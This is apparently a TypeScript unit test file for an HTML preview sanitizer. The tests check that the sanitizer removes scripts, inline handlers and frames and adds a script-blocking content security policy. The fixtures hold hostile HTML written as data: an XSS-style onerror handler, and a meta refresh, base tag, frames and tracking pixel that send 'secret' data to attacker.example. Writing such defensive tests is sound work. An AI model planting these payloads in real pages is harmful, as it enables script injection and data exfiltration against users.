import { STATIC_PREVIEW_CSP, buildStaticPreviewDocument } from './libraryStaticPreview';

const parse = (html: string) => {
    return new DOMParser().parseFromString(html, 'text/html');
};

const PAGE = `<!DOCTYPE html><html><head><script>alert(1)</script><title>Launch</title></head>
<body onload="alert(2)"><h1>Launch faster</h1><img src="x" onerror="alert(3)"><button onClick="go()">Go</button>
<script src="https://cdn.example/app.js"></script></body></html>`;

describe('buildStaticPreviewDocument', () => {
    it('puts a script-blocking policy first in the head', () => {
        const doc = parse(buildStaticPreviewDocument(PAGE, 'webpage'));
        const first = doc.head.firstElementChild;

        expect(first?.getAttribute('http-equiv')).toBe('Content-Security-Policy');
        expect(first?.getAttribute('content')).toBe(STATIC_PREVIEW_CSP);
    });

    it('drops scripts and inline handlers but keeps the content', () => {
        const output = buildStaticPreviewDocument(PAGE, 'webpage');
        const doc = parse(output);

        expect(doc.querySelectorAll('script')).toHaveLength(0);
        expect(output).not.toMatch(/\son[a-z]+=/i);
        expect(doc.querySelector('h1')?.textContent).toBe('Launch faster');
        expect(doc.title).toBe('Launch');
        expect(output.startsWith('<!DOCTYPE html>')).toBe(true);
    });

    it('blocks network loads and frames in the policy', () => {
        const directives = STATIC_PREVIEW_CSP.split(';').map((directive) => {
            return directive.trim();
        });

        expect(directives).toEqual(
            expect.arrayContaining([
                "default-src 'none'",
                "script-src 'none'",
                "style-src 'unsafe-inline'",
                'img-src data: blob:',
                'font-src data:',
                "base-uri 'none'",
                "form-action 'none'",
            ])
        );
        expect(STATIC_PREVIEW_CSP).not.toMatch(/https?:|\*/);
    });

    it('drops elements that navigate the frame or load another document', () => {
        const page = `<!DOCTYPE html><html><head>
<meta charset="utf-8">
<META HTTP-EQUIV="Refresh" content="0;url=https://attacker.example/?d=secret">
<base href="https://attacker.example/">
<link rel="stylesheet" href="https://cdn.example/site.css">
<link rel="dns-prefetch" href="//secret.attacker.example">
</head><body>
<h1>Report</h1>
<iframe src="https://attacker.example/frame"></iframe>
<frameset><frame src="https://attacker.example/f"></frameset>
<object data="https://attacker.example/o"></object>
<embed src="https://attacker.example/e">
<img src="https://attacker.example/pixel.png?d=secret" alt="beacon">
</body></html>`;
        const doc = parse(buildStaticPreviewDocument(page, 'webpage'));

        expect(
            doc.querySelectorAll('meta[http-equiv="refresh" i], base, link, iframe, frame, object, embed')
        ).toHaveLength(0);
        expect(doc.querySelector('meta[charset]')).not.toBeNull();
        expect(doc.querySelector('h1')?.textContent).toBe('Report');
        // Kept in the markup; the policy's img-src stops it loading.
        expect(doc.querySelector('img')?.getAttribute('alt')).toBe('beacon');
    });

    it('keeps inline styles and data images so self-contained pages still preview', () => {
        const page = `<html><head><style>h1 { color: red; }</style></head><body>
<h1 style="font-size: 2rem">Title</h1><img src="data:image/png;base64,AAAA" alt="inline"></body></html>`;
        const doc = parse(buildStaticPreviewDocument(page, 'presentation'));

        expect(doc.head.querySelectorAll('style')).toHaveLength(2);
        expect(doc.querySelector('h1')?.getAttribute('style')).toBe('font-size: 2rem');
        expect(doc.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,AAAA');
    });

    it("shows a deck's first slide without reveal.js", () => {
        const deck =
            '<html><head></head><body><div class="reveal"><div class="slides"><section>One</section></div></div></body></html>';
        const doc = parse(buildStaticPreviewDocument(deck, 'presentation'));

        expect(doc.head.querySelector('style')?.textContent).toContain('section:first-of-type');
        expect(parse(buildStaticPreviewDocument(PAGE, 'webpage')).head.querySelector('style')).toBeNull();
    });
});
